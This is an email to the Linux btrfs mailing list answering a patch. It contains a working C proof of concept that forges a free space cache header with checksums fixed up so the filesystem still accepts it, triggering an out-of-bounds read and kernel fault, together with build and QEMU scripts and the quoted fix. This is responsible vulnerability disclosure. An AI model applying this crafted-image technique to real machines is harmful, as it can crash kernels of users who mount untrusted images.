Received: from mail-pg1-f171.google.com (mail-pg1-f171.google.com [209.85.215.171])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 8A2CB34C98C
	for <linux-btrfs@vger.kernel.org>; Wed, 10 Jun 2026 17:51:03 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.215.171
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1781113866; cv=pass; b=ffD+3dbgDt0e4ZdBd88Xv3346uPCgls4wn5VB95to8w9Gbe6MUhhSnCc3X+lJSclDjf6gCnQALuiBuvNPCc+CA5MH5VlLlLaUS/gILSlej9dXFxdnvE2NrTdJ+b6C0xWQrwseUF482yZJog7ul8Kd8U7lMwiuVjMonO3AEoc14w=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1781113866; c=relaxed/simple;
	bh=+AuImVSWZo+j2BF246wOjdIlW2TUpPc9bF2oRxYvPjI=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=JCQcBlSwWjoVOuSlRpmBGnm/WhdEiYF2I1fVYdnAIIAWU70Cqnj91OyUkdkMk4AbHmCKRnhwNnZaY13haJClQipyaQWFspuvx5liZnHruuctqX9i3BFYtSqwzOemEWAO+3vIlebg7P/gCDaVSZTmu9fnCRPooaLfwJWq75fds7w=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=TVTW/+Bn; arc=pass smtp.client-ip=209.85.215.171
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=asu.edu
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b="TVTW/+Bn"
Received: by mail-pg1-f171.google.com with SMTP id 41be03b00d2f7-c858961a8efso2684246a12.2
        for <linux-btrfs@vger.kernel.org>; Wed, 10 Jun 2026 10:51:03 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1781113863; cv=none;
        d=google.com; s=arc-20240605;
        b=GtldAxQ/BGyy8JX1199XZl6uCOJvbwjwk1v4BZAHJxZVYP7BMiVks2qgkAtLIOU4YP
         RyCXSTXTYXAas4fJ0QpI6ZRBS1MCTMhw/iUxSt4Q85p1z3lo/b+2PlzXxmRncxl3UbvE
         r7FxdItD0mUM6z80DpMG97KNRkF3sXrqYhPV534t0QwwvRELnLp24+FaUPgJqz7nyzL4
         9piOFv+5NZ6QTmEB9QPjOQFv5AcbWCFFjtP4H02BLymXpqWk/bEYSDcL78QQJjAcjpfK
         AoikcCV6BY6qjXRuplufOFHFgfuTy7jqliajLqe2nB3kzlm3TQ8MMNgsSzOdZndjL6EO
         x52Q==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:dkim-signature;
        bh=D/VUIzb7849XydDHqppo33mmygchkfCwKfSbG6FSdzA=;
        fh=27W1wKix81TUVH+uxU1pKdyH5GoWdZVGPnzD8U+FQxY=;
        b=MQCDZte/G8xwCw4/2tM6AK6SZlTAFFx71zoZtUNwCcNThxxVb5rOuNVHeGk5kZrCSY
         uL1M4j7eaqAeOBnNZ5g3oNiN7muG/+aQg5opEitHFQWI44LobFMOaiUExMm+LpgBWBdD
         uqcuZ1NLQP3ewa7K6w9Fha1EJ/AXhwiP4GPMXNiqIjpu/YD9SkWkJucGgis5QUT+XRjI
         xPVclUOO6g/qSTVSX5y+hfVvAVFPEPoms4HQ78ZL+B9I4XpfLkc3sR7XdCXomKkN8qFK
         WwRBOr8zXGM3dsKZsIBoULmS3UTwhMSyULXgrksniIzn/JMAF4ufooHRjUW5E62Vrrjq
         1I3g==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=asu.edu; s=google; t=1781113863; x=1781718663; darn=vger.kernel.org;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:from:to:cc:subject:date
         :message-id:reply-to;
        bh=D/VUIzb7849XydDHqppo33mmygchkfCwKfSbG6FSdzA=;
        b=TVTW/+Bnx75091v5OVcYI7evl+sRARjUrwSGhPU83bFCQtOFICjvhY9k6MR03fmN69
         Msj499USW5WSB+UOXvSlLZ5q/cjgdljKp3WY/GvWM8/mzf6XGU4WTOeRA30Qds3ZgyBE
         Y1z2KemaeeXLYRezvfu7zhk6JO7lKVptDHbj8hiEYE0kQV4GmW8c+A/UQl19jHlJQ91Q
         dep6/1D9S21kiNdVwtmBBnpN2b8A7/9G9YePW6p34pIPdZdBAjxvIjwdVfqv9xwxxb8h
         xPtZRdUCFJoEY/dgYRI+b79j3ReGv0xOcb/Yk+KemVTYfk1klbZscGGtYbx7Kf3ifXOS
         LOKw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1781113863; x=1781718663;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:x-gm-gg:x-gm-message-state:from
         :to:cc:subject:date:message-id:reply-to;
        bh=D/VUIzb7849XydDHqppo33mmygchkfCwKfSbG6FSdzA=;
        b=bF70p5mL4L9VaK9q1UgEIXF83y2CzlHMRwFck3pKRD1OFJOTl67CuDGEHDgcWqrpoI
         /2SRfqdR6HXoKqGQ9FHTLRuyLRIzhu9sYJUH16yG+EAYPiW+jrQFzAO+eo5s1HvGUE/T
         2IAd/TLjGEL7CVjyNRBRG5/lK7PFvm5/RBe2TVD+6tkxaETLx6N2pRes1C7UUVMkXl2N
         gB1pmIrZR2SiWGTcqFofIwzOIqb+dmmzzTsy4FapPu5F3DRzTWCoNYq1daNQVe2cd6xN
         qdxoQ2zaQHb8LV53svjmrSH4f8W97t+Qthyd7q7yqHXPjmsiB6vCK9RMZ/xbDL7xqRKJ
         70bA==
X-Forwarded-Encrypted: i=1; AFNElJ/+WoB40DcyOURbZgP2VxZIfTH6IZXpociYtTYErz1jYsfvLA8cBn0Cb225Uljv7OW3Jm7R5Cnx1buoKw==@vger.kernel.org
X-Gm-Message-State: AOJu0YwqWIwewy8ARi9XFacPdwTg9gWchk1Zofkopzsren954FCLuUNx
	SZUm0gi/R2xmwrPvmgcpPW3ZvrMwDdV1QkPSeQn4g3nW9l+ZCwtzCgHkGlsGUWlStEs7rPajlyM
	aVT2htGeO2RrMpGxCFouzj5asu/FtbChaQH0zJExy
X-Gm-Gg: Acq92OFwTpRj0Op53NWhrKI28m7VeV/Eh2Llx4l/dTY1grAP+/YyH/dE1WfCwtz2Ur8
	ZykZVNOwRxF9vmd75PngvepYQqxfwuT9B7hznI0poA41U6FGZdSHm4d7NoAwrPPnAx3+pgohnlI
	Ob1yWvedCBWl4uASskzodwqoHINHS3wOjcLihkmNNeZ/nW8O8p3Fbf6Y1GbCXZltQb6Poehh25O
	0gIUyGVvWCJB97nwQJuMAxLXQ1blR4gEgphCso/PxUr3tn0LELriUEWOaOIfxzW5yPcapYZF2xu
	AIHJywtY3XNIk999QxYbb27Khb+lIEETGMP+B+i75IKp7oIfMCP+
X-Received: by 2002:a05:6a21:6e04:b0:3b3:2703:110 with SMTP id
 adf61e73a8af0-3b4ccd1b49cmr32065277637.4.1781113862752; Wed, 10 Jun 2026
 10:51:02 -0700 (PDT)
Precedence: bulk
X-Mailing-List: linux-btrfs@vger.kernel.org
List-Id: <linux-btrfs.vger.kernel.org>
List-Subscribe: <mailto:linux-btrfs+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-btrfs+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <20260610172926.844265-1-xmei5@asu.edu>
In-Reply-To: <20260610172926.844265-1-xmei5@asu.edu>
From: Xiang Mei <xmei5@asu.edu>
Date: Wed, 10 Jun 2026 10:50:51 -0700
X-Gm-Features: AVVi8CeG7lqtDVtID4-6UHw2h5x2m4CnMZrTMMlLsHSqCHDPtIUVoBmeomliuj0
Message-ID: <CAPpSM+RMPByMCKXvM5QFKToxsyNccfuFLWMdD0mfd0wh2Ja62w@mail.gmail.com>
Subject: Re: [PATCH btrfs v2] btrfs: reject free space cache with more entries
 than pages
To: David Sterba <dsterba@suse.com>, Chris Mason <clm@fb.com>, linux-btrfs@vger.kernel.org
Cc: Josef Bacik <josef@redhat.com>, Weiming Shi <bestswngs@gmail.com>, linux-kernel@vger.kernel.org
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

Thanks for your attention to this bug. We provide the PoC and method
to trigger the bug in this email.

1) Compile the kernel with the following config
CONFIG:
```
CONFIG_BTRFS_FS=3Dy
CONFIG_BTRFS_ASSERT=3Dn
```

2) Build the image with
```sh
#!/bin/sh
set -e
OUT=3D"${1:-base.img}"
SIZE=3D"${2:-2G}"

rm -f "$OUT"
truncate -s "$SIZE" "$OUT"
mkfs.btrfs -O ^free-space-tree -f "$OUT" >/dev/null
echo "wrote clean v1-cache btrfs image: $OUT ($SIZE)"
```

3) Run Qemu with
```sh
#!/bin/sh
set -e

qemu-system-x86_64 \
        -m 2G -smp 2 -enable-kvm -cpu host \
        -nographic -no-reboot \
        -kernel bzImage \
        -drive file=3Drootfs.img,if=3Dvirtio,format=3Draw \
        -drive file=3Dbase.img,if=3Dvirtio,format=3Draw \
        -append "console=3DttyS0 root=3D/dev/vda rw nokaslr oops=3Dpanic pa=
nic=3D-1"
```

4) Use the following PoC to trigger the bug
```c
// SPDX-License-Identifier: GPL-2.0
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mount.h>
#include <sys/ioctl.h>

#ifndef DEV
#define DEV       "/dev/vdc"
#endif
#define MNT       "/mnt"
#define NODESIZE  16384
#define SECTOR    4096
#define HDR       0x65
#define ITEM      25
#define FSH_SIZE  41
#define NEW_ENTRIES 0x10000
static const uint64_t FREE_SPACE_OBJECTID =3D (uint64_t)(-11);

static uint32_t crc32c(const uint8_t *p, size_t n)
{
        uint32_t crc =3D ~0u;
        for (size_t i =3D 0; i < n; i++) {
                crc ^=3D p[i];
                for (int k =3D 0; k < 8; k++)
                        crc =3D (crc >> 1) ^ (0x82F63B78u &
(-(int32_t)(crc & 1)));
        }
        return ~crc;
}

static uint64_t rd64(const uint8_t *p){ uint64_t v; memcpy(&v,p,8); return =
v; }
static uint32_t rd32(const uint8_t *p){ uint32_t v; memcpy(&v,p,4); return =
v; }
static void wr64(uint8_t *p, uint64_t v){ memcpy(p,&v,8); }
static void wr32(uint8_t *p, uint32_t v){ memcpy(p,&v,4); }

static uint64_t logical_to_phys(uint8_t *m, off_t sz, uint64_t logical)
{
        for (off_t off =3D 0; off + HDR <=3D sz; off +=3D SECTOR) {
                if (m[off + 0x64] !=3D 0)
                        continue;
                uint32_t nritems =3D rd32(m + off + 0x60);
                if (nritems =3D=3D 0 || nritems > 2000)
                        continue;
                for (uint32_t i =3D 0; i < nritems; i++) {
                        off_t ip =3D off + HDR + (off_t)i * ITEM;
                        if (ip + ITEM > sz) break;
                        if (rd64(m + ip) !=3D 256 || m[ip + 8] !=3D 228)
                                continue;
                        uint64_t koff =3D rd64(m + ip + 9);
                        off_t dp =3D off + HDR + rd32(m + ip + 17);
                        if (dp + 64 > sz) continue;
                        uint64_t length =3D rd64(m + dp);
                        if (logical >=3D koff && logical < koff + length)
                                return rd64(m + dp + 48 + 8) + (logical - k=
off);
                }
        }
        return logical;
}

static void forge_cache_page(uint8_t *m, off_t sz, uint64_t ino)
{
        for (off_t off =3D 0; off + HDR <=3D sz; off +=3D SECTOR) {
                if (m[off + 0x64] !=3D 0)
                        continue;
                uint32_t nritems =3D rd32(m + off + 0x60);
                if (nritems =3D=3D 0 || nritems > 2000)
                        continue;
                for (uint32_t i =3D 0; i < nritems; i++) {
                        off_t ip =3D off + HDR + (off_t)i * ITEM;
                        if (ip + ITEM > sz) break;
                        if (rd64(m + ip) !=3D ino || m[ip + 8] !=3D 108)
                                continue;
                        off_t dp =3D off + HDR + rd32(m + ip + 17);
                        if (dp + 53 > sz) continue;
                        uint64_t disk_bytenr =3D rd64(m + dp + 21);
                        if (disk_bytenr =3D=3D 0)
                                continue;
                        uint64_t num_bytes =3D rd64(m + dp + 45);
                        int num_pages =3D num_bytes / 4096;
                        if (num_pages < 1) num_pages =3D 1;
                        off_t base =3D logical_to_phys(m, sz, disk_bytenr);
                        if (base + (off_t)num_bytes > sz) continue;
                        uint8_t *p0 =3D m + base;
                        int crc_area =3D 4 * num_pages;
                        uint64_t voff =3D 0x4000000ULL;
                        for (int pg =3D 0; pg < num_pages; pg++) {
                                uint8_t *p =3D p0 + (off_t)pg * 4096;
                                int e =3D (pg =3D=3D 0) ? (crc_area + 8) : =
0;
                                for (; e + 17 <=3D 4096; e +=3D 17) {
                                        wr64(p + e, voff);
                                        wr64(p + e + 8, 0x1000);
                                        p[e + 16] =3D 1;
                                        voff +=3D 0x100000ULL;
                                }
                        }
                        for (int pg =3D 1; pg < num_pages; pg++)
                                wr32(p0 + pg * 4, crc32c(p0 +
(off_t)pg * 4096, 4096));
                        wr32(p0 + 0, crc32c(p0 + crc_area, 4096 - crc_area)=
);
                        return;
                }
        }
}

static int patch_device(const char *dev)
{
        int fd =3D open(dev, O_RDWR);
        if (fd < 0) { perror("open"); return -1; }
        off_t sz =3D lseek(fd, 0, SEEK_END);
        uint8_t *m =3D malloc(sz);
        lseek(fd, 0, SEEK_SET);
        for (off_t got =3D 0; got < sz; ) {
                ssize_t r =3D read(fd, m + got, sz - got);
                if (r <=3D 0) break;
                got +=3D r;
        }

        int patched =3D 0;
        for (off_t off =3D 0; off + HDR <=3D sz; off +=3D SECTOR) {
                if (m[off + 0x64] !=3D 0)
                        continue;
                uint32_t nritems =3D rd32(m + off + 0x60);
                if (nritems =3D=3D 0 || nritems > 2000)
                        continue;
                int hit =3D 0;
                for (uint32_t i =3D 0; i < nritems; i++) {
                        off_t ip =3D off + HDR + (off_t)i * ITEM;
                        if (ip + ITEM > sz) break;
                        uint32_t isize =3D rd32(m + ip + 21);
                        if (rd64(m + ip) !=3D FREE_SPACE_OBJECTID ||
                            m[ip + 8] !=3D 0 || isize !=3D FSH_SIZE)
                                continue;
                        off_t dptr =3D off + HDR + rd32(m + ip + 17);
                        if (dptr + FSH_SIZE > sz) continue;
                        uint64_t fino =3D rd64(m + dptr + 0);
                        wr64(m + dptr + 25, NEW_ENTRIES);
                        forge_cache_page(m, sz, fino);
                        hit =3D 1; patched++;
                }
                if (hit)
                        wr32(m + off, crc32c(m + off + 0x20, NODESIZE - 0x2=
0));
        }
        lseek(fd, 0, SEEK_SET);
        for (off_t wr =3D 0; wr < sz; ) {
                ssize_t w =3D write(fd, m + wr, sz - wr);
                if (w <=3D 0) break;
                wr +=3D w;
        }
        fsync(fd);
        close(fd);
        free(m);
        return patched;
}

#define BTRFS_IOC_SYNC _IO(0x94, 8)

static int mnt_v1(void)
{
        return mount(DEV, MNT, "btrfs", 0, "space_cache=3Dv1");
}

static void churn(void)
{
        static char b[1 << 20];
        memset(b, 'F', sizeof b);
        for (int i =3D 0; i < 300; i++) {
                char p[64]; snprintf(p, sizeof p, MNT "/b%03d", i);
                int fd =3D open(p, O_CREAT | O_WRONLY, 0644);
                if (fd >=3D 0) { (void)!write(fd, b, sizeof b);
fsync(fd); close(fd); }
        }
        sync();
        for (int i =3D 0; i < 300; i +=3D 3) {
                char p[64]; snprintf(p, sizeof p, MNT "/b%03d", i);
                unlink(p);
        }
        sync();
}

static void bake_cache(void)
{
        static char big[8 << 20];
        memset(big, 'D', sizeof big);

        mnt_v1();
        int dfd =3D open(MNT, O_RDONLY | O_DIRECTORY);
        churn();
        for (int cyc =3D 0; cyc < 10; cyc++) {
                char p[64]; snprintf(p, sizeof p, MNT "/dirty%d", cyc);
                int t =3D open(p, O_CREAT | O_WRONLY, 0644);
                if (t >=3D 0) { (void)!write(t, big, sizeof big);
fsync(t); close(t); }
                if (cyc > 0) {
                        char q[64]; snprintf(q, sizeof q, MNT
"/dirty%d", cyc - 1);
                        unlink(q);
                }
                if (dfd >=3D 0) ioctl(dfd, BTRFS_IOC_SYNC, 0);
                sync();
        }
        if (dfd >=3D 0) close(dfd);
        umount(MNT);

        if (mnt_v1() =3D=3D 0) {
                int t =3D open(MNT "/again", O_CREAT | O_WRONLY, 0644);
                if (t >=3D 0) { (void)!write(t, "y", 1); close(t); }
                churn(); sync(); sleep(1); umount(MNT);
        }
        if (mnt_v1() =3D=3D 0) {
                int t =3D open(MNT "/again2", O_CREAT | O_WRONLY, 0644);
                if (t >=3D 0) { (void)!write(t, "z", 1); close(t); }
                sync(); sleep(1); umount(MNT);
        }
}

int main(void)
{
        mkdir(MNT, 0755);

        bake_cache();
        puts("[poc] baked v1 cache");

        printf("[poc] patched %d header(s)\n", patch_device(DEV));

        if (mnt_v1()) {
                perror("[poc] mount(trigger)");
                return 1;
        }
        puts("[poc] remounted; allocating to force block-group caching");
        for (int i =3D 0; i < 8; i++) {
                char p[64]; snprintf(p, sizeof p, MNT "/t%d", i);
                int fd =3D open(p, O_CREAT | O_WRONLY, 0644);
                if (fd >=3D 0) {
                        char b[65536]; memset(b, 'a' + i, sizeof b);
                        for (int j =3D 0; j < 16; j++)
                                if (write(fd, b, sizeof b) < 0) break;
                        fsync(fd); close(fd);
                }
        }
        sync();
        sleep(2);
        puts("[poc] no crash (kernel is patched?)");
        return 0;
}
```


Feel free to let us know if you'd like more information about this
bug. We are glad to help.

Best,
Xiang

On Wed, Jun 10, 2026 at 10:29=E2=80=AFAM Xiang Mei <xmei5@asu.edu> wrote:
>
> When loading a v1 free space cache, __load_free_space_cache() takes
> num_entries and num_bitmaps straight from the on-disk
> btrfs_free_space_header. That header is stored in the tree_root under a k=
ey
> with type 0, which the tree-checker has no case for, so neither count is
> validated before the load trusts it.
>
> The load loops num_entries times and maps the next page whenever the curr=
ent
> one runs out, going through io_ctl_check_crc() -> io_ctl_map_page(), whic=
h
> does io_ctl->pages[io_ctl->index++]. But pages[] is allocated in
> io_ctl_init() from the cache inode's i_size, not from num_entries:
>
>         num_pages =3D DIV_ROUND_UP(i_size_read(inode), PAGE_SIZE);
>         io_ctl->pages =3D kcalloc(num_pages, sizeof(struct page *), GFP_N=
OFS);
>
> So if num_entries claims more records than the pages can hold, io_ctl->in=
dex
> runs off the end of pages[]. The write side never hits this because
> io_ctl_add_entry() and io_ctl_add_bitmap() both stop once
> io_ctl->index >=3D io_ctl->num_pages; the read side just never had the sa=
me
> check.
>
> To trigger it, take a clean cache (num_entries =3D <N> here), set num_ent=
ries
> in the header to 0x10000, and fix up the leaf checksum so it still passes
> the tree-checker. The cache inode has i_size =3D 65536, so num_pages is 1=
6 and
> pages[] is a 16-pointer (kmalloc-128) array. The load now tries to read
> 65536 entries, io_ctl->index walks up to 16, and pages[16] is read past t=
he
> array:
>
>   BUG: KASAN: slab-out-of-bounds in io_ctl_check_crc (fs/btrfs/free-space=
-cache.c:420 fs/btrfs/free-space-cache.c:565)
>   Read of size 8 at addr ffff88800c833a80 by task kworker/u8:3/58
>    io_ctl_check_crc (fs/btrfs/free-space-cache.c:420 fs/btrfs/free-space-=
cache.c:565)
>    __load_free_space_cache (fs/btrfs/free-space-cache.c:655 fs/btrfs/free=
-space-cache.c:820)
>    load_free_space_cache (fs/btrfs/free-space-cache.c:1017)
>    caching_thread (fs/btrfs/block-group.c:880)
>    btrfs_work_helper (fs/btrfs/async-thread.c:312)
>    process_one_work
>    worker_thread
>    kthread
>    ret_from_fork
>
> free-space-cache.c:420 is io_ctl_map_page(), inlined into io_ctl_check_cr=
c()
> at line 565, which is why that is the frame KASAN names. The out-of-bound=
s
> slot is then treated as a struct page and handed to crc32c(), so the bad
> read turns into a GP fault.
>
> Add the missing check to io_ctl_check_crc(), which is where both the entr=
y
> loop and the bitmap loop end up. When num_entries is too large the load n=
ow
> fails like any corrupt cache: __load_free_space_cache() drops it and rebu=
ilds
> the free space from the extent tree, so a valid cache is never rejected.
>
> Fixes: 5b0e95bf607d ("Btrfs: inline checksums into the disk free space ca=
che")
> Reported-by: Weiming Shi <bestswngs@gmail.com>
> Assisted-by: Claude:claude-opus-4-8
> Signed-off-by: Xiang Mei <xmei5@asu.edu>
> ---
> v2: add more details in the commit message
>
>  fs/btrfs/free-space-cache.c | 3 +++
>  1 file changed, 3 insertions(+)
>
> diff --git a/fs/btrfs/free-space-cache.c b/fs/btrfs/free-space-cache.c
> index ab22e4f9ffdd..bbc4db7fe74b 100644
> --- a/fs/btrfs/free-space-cache.c
> +++ b/fs/btrfs/free-space-cache.c
> @@ -555,6 +555,9 @@ static int io_ctl_check_crc(struct btrfs_io_ctl *io_c=
tl, int index)
>         u32 crc =3D ~(u32)0;
>         unsigned offset =3D 0;
>
> +       if (index >=3D io_ctl->num_pages)
> +               return -EIO;
> +
>         if (index =3D=3D 0)
>                 offset =3D sizeof(u32) * io_ctl->num_pages;
>
> --
> 2.43.0
>
